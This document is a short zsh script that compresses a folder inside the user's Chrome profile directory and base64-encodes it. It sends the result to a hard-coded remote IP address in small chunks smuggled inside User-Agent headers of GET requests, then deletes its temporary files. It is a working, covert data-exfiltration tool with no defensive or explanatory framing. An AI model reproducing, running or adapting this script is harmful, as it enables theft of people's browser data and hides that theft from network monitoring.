#!/bin/zsh

TARGET_DIR="$HOME/Library/Application Support/Google/Chrome/temp"
ARCHIVE_PATH="/tmp/chrome_temp.zip"
ENCODED_PATH="/tmp/chrome_temp.b64"
SERVER_URL="http://159.223.159.200:8080"
AUTH_TOKEN="XoGDSHomKmv2IeSyCetVbMc9NOxC5uwc"
CHUNK_SIZE=3000  # ~3KB per header is safe

echo "[*] Compressing Chrome profile..."
rm -f "$ARCHIVE_PATH" "$ENCODED_PATH"
/usr/bin/zip -r "$ARCHIVE_PATH" "$TARGET_DIR" >/dev/null

if [[ ! -f "$ARCHIVE_PATH" ]]; then
    echo "[!] Zip failed."
    exit 1
fi

echo "[*] Encoding..."
base64 -i "$ARCHIVE_PATH" -o "$ENCODED_PATH"

echo "[*] Sending via GET + User-Agent headers..."
while IFS= read -r line; do
    echo "$line" | fold -w "$CHUNK_SIZE" | while IFS= read -r chunk; do
        curl -s -X GET "$SERVER_URL" \
            -H "X-Auth-Token: $AUTH_TOKEN" \
            -H "User-Agent: $chunk" > /dev/null
        sleep 0.3  # slight delay for reliability
    done
done < "$ENCODED_PATH"

echo "[*] Done. Cleaning up..."
rm -f "$ARCHIVE_PATH" "$ENCODED_PATH"

